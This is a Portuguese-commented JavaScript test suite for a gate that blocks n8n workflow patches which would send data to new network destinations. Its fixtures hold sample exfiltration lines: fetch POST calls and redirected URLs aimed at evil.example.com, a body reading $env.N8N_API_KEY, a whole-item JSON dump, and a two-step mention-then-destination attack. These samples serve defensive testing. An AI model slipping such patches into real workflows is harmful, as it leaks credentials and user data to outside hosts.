"use strict";
/* rede-test.js — o portão de destino de rede, e a fiação dele.
 *
 * De graça: nenhum modelo, nenhuma rede, nada escrito no repositório, nada que
 * alcance o n8n. `node rede-test.js`.
 *
 * DUAS COISAS QUE ESTE ARQUIVO FAZ DE PROPÓSITO, as duas por lição paga hoje:
 *
 * 1. A FIAÇÃO É MEDIDA SOBRE FONTE SEM COMENTÁRIO. O `dossie-tela-test.js` já teve
 *    dois casos ficarem VERDES porque um comentário carregava o nome que o
 *    `includes` procurava — um teste que casa dentro de comentário aprova a
 *    AUSÊNCIA da decisão. Aqui os comentários são justamente onde o nome
 *    `checaRede` mais aparece, então medir o fonte cru seria garantir o falso
 *    verde.
 *
 * 2. AS BUSCAS NO FONTE LANÇAM QUANDO NÃO ACHAM. O `cofre-test.js` de hoje
 *    recortava o fonte a partir de um literal; o literal mudou, o `indexOf` deu
 *    -1, o `slice` devolveu "" e todo caso sobre string vazia passou trivialmente
 *    — verde e cego, que some da bandeja como se estivesse provado. `precisa()`
 *    abaixo é a resposta: extração que não acha o alvo é FALHA, nunca fatia vazia.
 *
 * E o mutante que este arquivo mais persegue é o que PRESERVA a contagem: mover a
 * classificação de um tipo de achado entre `REPROVAM_REDE` e o resto mantém todos
 * os totais e desliga o bloqueio. Contar não pega; identificar pega. */

const fs = require("fs");
const path = require("path");
const assert = require("assert");

const rede = require("./rede.js");
const bateria = require("./bateria.js");

let ok = 0;
const falhas = [];
function t(nome, fn) {
  try { fn(); ok++; }
  catch (e) { falhas.push(nome + "\n      " + String((e && e.message) || e).split("\n")[0]); }
}

/* Fonte sem comentário. Tira `/* … *​/` e `// …` — o suficiente para que um nome
   citado numa explicação não satisfaça um `includes` sobre a decisão. */
function fonteLimpa(arquivo) {
  const bruto = fs.readFileSync(path.join(__dirname, arquivo), "utf8");
  return bruto.replace(/\/\*[\s\S]*?\*\//g, " ").replace(/(^|[^:])\/\/[^\n]*/g, "$1 ");
}

/* Busca no fonte que FALHA ALTO. Sem isto, renomear o alvo transforma todo caso
   seguinte em asserção sobre nada. */
function precisa(fonte, agulha, onde) {
  if (fonte.indexOf(agulha) < 0) {
    throw new Error("não achei `" + agulha + "` em " + onde
      + " — ou a fiação sumiu, ou o alvo foi renomeado e este teste ficou cego");
  }
  return true;
}

const FLUXO = {
  name: "Fluxo",
  nodes: [
    { id: "1", name: "Gatilho", type: "n8n-nodes-base.webhook", typeVersion: 2, position: [0, 0],
      parameters: { path: "x" } },
    { id: "2", name: "CRM", type: "n8n-nodes-base.httpRequest", typeVersion: 4.2, position: [200, 0],
      parameters: { method: "POST", url: "https://crm.ecommercepuro.com.br/leads" } },
    { id: "3", name: "Slack", type: "n8n-nodes-base.httpRequest", typeVersion: 4.2, position: [400, 0],
      parameters: { method: "POST", url: "https://hooks.slack.com/services/T/B/C" } }
  ],
  connections: {}, settings: {}
};

/* Aplica um patch sem passar pelo `applyPatch`: aqui o objeto de teste É o depois.
   Manter os dois documentos explícitos deixa cada caso legível sozinho. */
function comNo(base, nome, parameters) {
  const copia = JSON.parse(JSON.stringify(base));
  const alvo = copia.nodes.find(n => n.name === nome);
  if (!alvo) throw new Error("fixture sem o nó `" + nome + "`");
  alvo.parameters = parameters;
  return copia;
}
function maisNo(base, no) {
  const copia = JSON.parse(JSON.stringify(base));
  copia.nodes.push(no);
  return copia;
}
const tipos = r => r.achados.map(a => a.tipo).sort();

/* ══════════════════ bloco 1 — hostsDe, e o bypass que ele fecha ═════════════ */

t("1.1 host simples", () => {
  assert.deepStrictEqual(rede.hostsDe("https://a.com/x"), ["a.com"]);
});

t("1.2 DOIS hosts na mesma string — o bypass", () => {
  /* A primeira versão devolvia só o primeiro. Pôr um endereço legítimo na frente
     do de exfiltração, no mesmo campo, escondia o segundo para sempre. */
  assert.deepStrictEqual(
    rede.hostsDe("// doc https://docs.n8n.io\nawait fetch(\"https://evil.example.com\")"),
    ["docs.n8n.io", "evil.example.com"]);
});

t("1.3 três hosts, ordem preservada", () => {
  assert.deepStrictEqual(rede.hostsDe("https://a.com https://b.com https://c.com"),
    ["a.com", "b.com", "c.com"]);
});

t("1.4 usuário:senha@host devolve só o host", () => {
  assert.deepStrictEqual(rede.hostsDe("https://user:pw@evil.example.com/x"), ["evil.example.com"]);
});

t("1.5 porta não muda o destino", () => {
  assert.deepStrictEqual(rede.hostsDe("https://a.com:8443/x"), ["a.com"]);
});

t("1.6 caixa alta normaliza", () => {
  assert.deepStrictEqual(rede.hostsDe("HTTPS://Evil.Example.COM/x"), ["evil.example.com"]);
});

t("1.7 sem esquema não é host", () => {
  assert.deepStrictEqual(rede.hostsDe("fale com suporte@a.com sobre a.com"), []);
});

t("1.8 wss e ftp contam", () => {
  assert.deepStrictEqual(rede.hostsDe("wss://a.com ftp://b.com"), ["a.com", "b.com"]);
});

t("1.9 lastIndex não vaza entre chamadas", () => {
  /* Regex com /g guarda estado. Sem o reset, a segunda chamada começa no meio da
     primeira e perde host — falha intermitente, que é a pior de achar. */
  rede.hostsDe("https://a.com https://b.com");
  assert.deepStrictEqual(rede.hostsDe("https://c.com"), ["c.com"]);
});

t("1.10 hostDe devolve o primeiro, não o único", () => {
  assert.strictEqual(rede.hostDe("https://a.com https://b.com"), "a.com");
  assert.strictEqual(rede.hostDe("sem host"), null);
});

/* ═════════════ bloco 2 — destino contra menção, a calibração medida ═════════ */

t("2.1 url é destino", () => {
  const p = rede.perfilDoNo({ parameters: { url: "https://a.com" } });
  assert.deepStrictEqual([...p.hosts], ["a.com"]);
  assert.deepStrictEqual([...p.mencoes], []);
});

t("2.2 systemMessage é menção, não destino", () => {
  /* Medido em 22 fluxos reais, 749 nós: 44% das ocorrências de host estão em
     chaves que não são destino. Tratar igual faria editar prompt virar vermelho. */
  const p = rede.perfilDoNo({ parameters: { options: { systemMessage: "veja https://a.com" } } });
  assert.deepStrictEqual([...p.hosts], []);
  assert.deepStrictEqual([...p.mencoes], ["a.com"]);
});

t("2.3 value debaixo de url É destino (resourceLocator)", () => {
  const p = rede.perfilDoNo({ parameters: { url: { __rl: true, value: "https://a.com", mode: "url" } } });
  assert.ok(p.hosts.has("a.com"), "resourceLocator sob `url` tem de contar como destino");
});

t("2.4 value debaixo de documentId NÃO é destino", () => {
  const p = rede.perfilDoNo({ parameters: { documentId: { __rl: true, value: "https://docs.google.com/d/1" } } });
  assert.deepStrictEqual([...p.hosts], []);
  assert.ok(p.mencoes.has("docs.google.com"));
});

t("2.5 jsCode é destino", () => {
  const p = rede.perfilDoNo({ parameters: { jsCode: "fetch('https://a.com')" } });
  assert.ok(p.hosts.has("a.com"));
  assert.strictEqual(p.codigo.length, 1);
});

t("2.6 link de doc em comentário de jsCode NÃO é primitiva de rede", () => {
  const p = rede.perfilDoNo({ parameters: { jsCode: "// veja https://docs.n8n.io\nreturn $input.all();" } });
  assert.strictEqual(p.codigo.length, 0, "mencionar http num comentário não abre conexão");
});

t("2.7 as primitivas NATIVAS do n8n contam — nao so fetch", () => {
  /* A primeira versao so conhecia `fetch`, e essa era a metade que menos importa
     aqui: um no `Code` do n8n faz requisicao com `this.helpers.httpRequest`, que e
     o que a documentacao ensina. As quatro passavam batido, ou seja o achado
     `codigoRede` era cego para o caminho mais provavel deste ecossistema. */
  for (const c of ["this.helpers.httpRequest({url:'https://a.com'})",
                   "helpers.request('https://a.com')",
                   "$http.get('https://a.com')",
                   "await fetch('https://a.com')"]) {
    assert.ok(rede.CODIGO_REDE.test(c), "devia pegar: " + c);
  }
});

t("2.8 host em campo de codigo SEM primitiva e mencao, nao destino", () => {
  /* MEDIDO na instancia viva, so GET: 74 fluxos, 2268 nos, 324 campos de codigo,
     16 com host dentro, e 15 desses 16 (94%) sem primitiva nenhuma. Sao links em
     texto. Trata-los como destino faria um patch que acrescenta um link de
     documentacao dentro de um `Code` acender a linha que BLOQUEIA o botao. */
  const p = rede.perfilDoNo({ parameters: { jsCode: "// veja https://drive.google.com/x" + String.fromCharCode(10) + "return $input.all();" } });
  assert.deepStrictEqual([...p.hosts], []);
  assert.deepStrictEqual([...p.mencoes], ["drive.google.com"]);
});

t("2.9 ...mas COM primitiva volta a ser destino", () => {
  const p = rede.perfilDoNo({ parameters: { jsCode: "await this.helpers.httpRequest({url:'https://evil.example.com'})" } });
  assert.ok(p.hosts.has("evil.example.com"), "com primitiva o host tem de contar como destino");
});

t("2.10 a calibracao DEPENDE do CODIGO_REDE, e o teste diz isso", () => {
  /* Uma primitiva que o `CODIGO_REDE` nao conheca rebaixa o host ao lado dela para
     MENCAO — o host deixa de bloquear. Entao acrescentar primitiva ali nao melhora
     so o achado `codigoRede`: decide se o vizinho e destino. Este caso existe para
     que quem mexer no regex saiba que mexeu em duas coisas. */
  const inventada = rede.perfilDoNo({ parameters: { jsCode: "primitivaQueNinguemConhece('https://evil.example.com')" } });
  assert.ok(!inventada.hosts.has("evil.example.com"),
    "primitiva desconhecida rebaixa o host — e essa e a divida declarada desta regra");
  assert.ok(inventada.mencoes.has("evil.example.com"), "mas nao some: vira mencao");
});

/* ═══════════════ bloco 3 — o que TEM de pegar (os ataques medidos) ══════════ */

t("3.1 redireciona url de nó existente", () => {
  const depois = comNo(FLUXO, "CRM", { method: "POST", url: "https://evil.example.com/x" });
  const r = rede.varrer(FLUXO, depois);
  assert.deepStrictEqual(tipos(r), ["destinoNovo"]);
  assert.strictEqual(r.achados[0].host, "evil.example.com");
  assert.strictEqual(r.achados[0].novoNo, false);
});

t("3.2 httpRequest novo", () => {
  const depois = maisNo(FLUXO, { id: "9", name: "Espelho", type: "n8n-nodes-base.httpRequest",
    typeVersion: 4.2, position: [600, 0], parameters: { url: "https://evil.example.com/x" } });
  const r = rede.varrer(FLUXO, depois);
  assert.deepStrictEqual(tipos(r), ["destinoNovo"]);
  assert.strictEqual(r.achados[0].novoNo, true);
});

t("3.3 Code com fetch dá DOIS achados", () => {
  const depois = maisNo(FLUXO, { id: "9", name: "Coleta", type: "n8n-nodes-base.code",
    typeVersion: 2, position: [600, 0],
    parameters: { jsCode: "await fetch('https://evil.example.com',{method:'POST'})" } });
  assert.deepStrictEqual(tipos(rede.varrer(FLUXO, depois)), ["codigoRede", "destinoNovo"]);
});

t("3.4 despejo do item inteiro", () => {
  const depois = comNo(FLUXO, "CRM", { url: "https://crm.ecommercepuro.com.br/leads",
    jsonBody: "={{ JSON.stringify($json) }}" });
  assert.deepStrictEqual(tipos(rede.varrer(FLUXO, depois)), ["despejo"]);
});

t("3.5 leitura de segredo do ambiente", () => {
  const depois = comNo(FLUXO, "CRM", { url: "https://crm.ecommercepuro.com.br/leads",
    jsonBody: "={{ $env.N8N_API_KEY }}" });
  assert.deepStrictEqual(tipos(rede.varrer(FLUXO, depois)), ["leSegredo"]);
});

t("3.6 url que vira dinâmica", () => {
  const depois = comNo(FLUXO, "CRM", { url: "={{ $json.callback }}" });
  assert.deepStrictEqual(tipos(rede.varrer(FLUXO, depois)), ["destinoDinamico"]);
});

t("3.7 destino escondido como SEGUNDA url do campo", () => {
  const depois = comNo(FLUXO, "CRM", {
    jsCode: "// https://crm.ecommercepuro.com.br\nfetch('https://evil.example.com')" });
  const r = rede.varrer(FLUXO, depois);
  assert.ok(r.achados.some(a => a.tipo === "destinoNovo" && a.host === "evil.example.com"),
    "o host escondido atrás de um legítimo tem de aparecer");
});

t("3.8 ATAQUE EM DOIS PASSOS: menção não vira crédito de destino", () => {
  /* A régua de destino é mais estreita que a de menção de propósito. Sem isso,
     a rodada 1 põe o host num prompt (achado fraco, fácil de aprovar) e a rodada
     2 o promove a `url` em silêncio. */
  const antes = comNo(FLUXO, "Slack", { options: { systemMessage: "veja https://evil.example.com" } });
  const depois = comNo(antes, "CRM", { url: "https://evil.example.com/x" });
  const r = rede.varrer(antes, depois);
  assert.ok(r.achados.some(a => a.tipo === "destinoNovo" && a.host === "evil.example.com"),
    "host apenas MENCIONADO antes não pode liberar o destino depois");
});

/* ══════════ bloco 4 — o que NÃO pode pegar (falso positivo mata o portão) ═══ */

t("4.1 muda método, mesmo destino", () => {
  const depois = comNo(FLUXO, "CRM", { method: "PUT", url: "https://crm.ecommercepuro.com.br/leads" });
  assert.deepStrictEqual(tipos(rede.varrer(FLUXO, depois)), []);
});

t("4.2 nó novo para host que o FLUXO já usa", () => {
  const depois = maisNo(FLUXO, { id: "9", name: "Aviso", type: "n8n-nodes-base.httpRequest",
    typeVersion: 4.2, position: [600, 0], parameters: { url: "https://hooks.slack.com/services/T/B/C" } });
  assert.deepStrictEqual(tipos(rede.varrer(FLUXO, depois)), [],
    "a régua é o fluxo inteiro, não o nó — senão todo split de nó vira alerta");
});

t("4.3 campo específico não é despejo", () => {
  const depois = comNo(FLUXO, "CRM", { url: "https://crm.ecommercepuro.com.br/leads",
    jsonBody: "={{ $json.nome }} - {{ $json.email }}" });
  assert.deepStrictEqual(tipos(rede.varrer(FLUXO, depois)), [],
    "mandar um campo é o que todo fluxo faz");
});

t("4.4 nó que JÁ tinha fetch não vira achado ao ser tocado por outro motivo", () => {
  const antes = comNo(FLUXO, "CRM", { jsCode: "fetch('https://crm.ecommercepuro.com.br')" });
  const depois = comNo(antes, "CRM", { jsCode: "fetch('https://crm.ecommercepuro.com.br') // ajuste" });
  assert.deepStrictEqual(tipos(rede.varrer(antes, depois)), []);
});

t("4.5 documento idêntico não produz achado nenhum", () => {
  assert.deepStrictEqual(tipos(rede.varrer(FLUXO, FLUXO)), []);
});

t("4.6 prompt ganha link é MENÇÃO, nunca destino", () => {
  const depois = comNo(FLUXO, "Slack", { options: { systemMessage: "veja https://ajuda.exemplo.com" } });
  const r = rede.varrer(FLUXO, depois);
  assert.deepStrictEqual(tipos(r), ["mencaoNova"],
    "editar prompt de agente não pode acender a linha que bloqueia o botão");
});

/* ═══════════════════ bloco 5 — os tetos falham ALTO, nunca em silêncio ══════ */

t("5.1 teto de profundidade vira achado", () => {
  let fundo = "https://evil.example.com";
  for (let i = 0; i < rede.PROF_MAX + 4; i++) fundo = { n: fundo };
  const depois = comNo(FLUXO, "CRM", { url: "https://crm.ecommercepuro.com.br/leads", fundo });
  const r = rede.varrer(FLUXO, depois);
  assert.ok(r.achados.some(a => a.tipo === "teto"),
    "um portão que desiste em silêncio deixa a tela verde do mesmo jeito");
});

t("5.2 a frase do teto diz que não conferiu", () => {
  const f = rede.frase({ tipo: "teto", no: "X", limite: "profundidade" });
  assert.ok(/não conferido|não terminei/i.test(f), "a frase tem de admitir a lacuna: " + f);
});

/* ═════════════ bloco 6 — a FIAÇÃO, sobre fonte sem comentário ═══════════════ */

const BAT = fonteLimpa("bateria.js");

t("6.1 bateria.js importa o rede.js", () => {
  precisa(BAT, 'require("./rede.js")', "bateria.js (sem comentário)");
});

t("6.2 checaRede está DENTRO da lista de linhas de bateria()", () => {
  const i = BAT.indexOf("const linhas = [");
  assert.ok(i > 0, "não achei a montagem das linhas em bateria()");
  const bloco = BAT.slice(i, BAT.indexOf("]", i));
  precisa(bloco, "checaRede", "a lista de linhas de bateria()");
});

t("6.3 checaRede é exportada", () => {
  assert.strictEqual(typeof bateria.checaRede, "function");
});

t("6.4 REPROVAM_REDE tem os três tipos que bloqueiam, e só eles", () => {
  /* O MUTANTE QUE ESTE CASO EXISTE PARA PEGAR preserva a contagem: mover um tipo
     daqui para fora mantém todo total e desliga o bloqueio. Contar não pega. */
  assert.deepStrictEqual([...bateria.REPROVAM_REDE].sort(),
    ["codigoRede", "destinoDinamico", "destinoNovo"]);
});

t("6.5 destinoNovo REPROVA e portanto bloqueia o botão", () => {
  const depois = comNo(FLUXO, "CRM", { method: "POST", url: "https://evil.example.com/x" });
  const l = bateria.checaRede(FLUXO, depois, null);
  assert.strictEqual(l.cor, "risk", "destino novo tem de reprovar, não ressalvar");
  assert.ok(bateria.BLOQUEIAM.has(l.cor), "a cor de reprovação tem de estar em BLOQUEIAM");
});

t("6.6 mencaoNova RESSALVA e não bloqueia", () => {
  const depois = comNo(FLUXO, "Slack", { options: { systemMessage: "veja https://ajuda.exemplo.com" } });
  const l = bateria.checaRede(FLUXO, depois, null);
  assert.strictEqual(l.cor, "warn");
  assert.ok(!bateria.BLOQUEIAM.has(l.cor));
});

t("6.7 sem mudança nenhuma a linha fica verde", () => {
  assert.strictEqual(bateria.checaRede(FLUXO, FLUXO, null).cor, "ok");
});

t("6.8 o portão quebrado REPROVA, nunca fica cinza", () => {
  /* Cinza é "não dá para conferir aqui" e não bloqueia. Para esta checagem isso
     seria fail-open: o portão que decide sobre saída de dado não rodou e o botão
     apareceria. É a única das checagens deste arquivo que não pode ficar cinza. */
  const quebrado = { varrer() { throw new Error("boom"); }, frase: rede.frase };
  const l = bateria.checaRede(FLUXO, FLUXO, { rede: quebrado });
  assert.strictEqual(l.cor, "risk", "falha do portão de rede tem de fechar, não abrir");
  assert.ok(/boom/.test(l.frase), "a frase tem de carregar o motivo real");
});

t("6.9 bateria() inteira bloqueia um patch de exfiltração", () => {
  const depois = comNo(FLUXO, "CRM", { method: "POST", url: "https://evil.example.com/x" });
  const r = bateria.bateria({ documento: FLUXO, patch: { updateNodes: [{ name: "CRM" }] },
    proposta: depois, contexto: { wfId: "a", wfNome: "F" } });
  assert.strictEqual(r.podeAplicar, false, "o botão de aplicar não pode aparecer");
  assert.ok(r.linhas.some(l => l.n === "8" && l.cor === "risk"));
});

/* ════════════════ bloco 7 — as frases são distintas e nomeiam o nó ══════════ */

t("7.1 cada tipo tem frase própria", () => {
  const base = { no: "X", host: "a.com", caminho: "url", trecho: "t", limite: "profundidade" };
  const fs_ = ["destinoNovo", "mencaoNova", "destinoDinamico", "codigoRede", "leSegredo", "despejo", "teto"]
    .map(tipo => rede.frase(Object.assign({ tipo }, base)));
  assert.strictEqual(new Set(fs_).size, fs_.length,
    "duas frases iguais para causas diferentes ensinam a ignorar as duas");
  for (const f of fs_) assert.ok(f.includes("X"), "toda frase tem de nomear o nó: " + f);
});

t("7.2 destinoNovo e mencaoNova NÃO podem ler igual", () => {
  const d = rede.frase({ tipo: "destinoNovo", no: "X", host: "a.com" });
  const m = rede.frase({ tipo: "mencaoNova", no: "X", host: "a.com" });
  assert.notStrictEqual(d, m);
  assert.ok(/alcança/.test(d) && /cita/.test(m),
    "uma diz que o nó CHAMA o endereço, a outra que ele só o menciona");
});

/* ═══════════════════════════════════ resultado ══════════════════════════════ */

console.log("\nrede-test.js — " + ok + " ok, " + falhas.length + " falha(s)");
for (const f of falhas) console.log("  ✗ " + f);
process.exit(falhas.length ? 1 : 0);
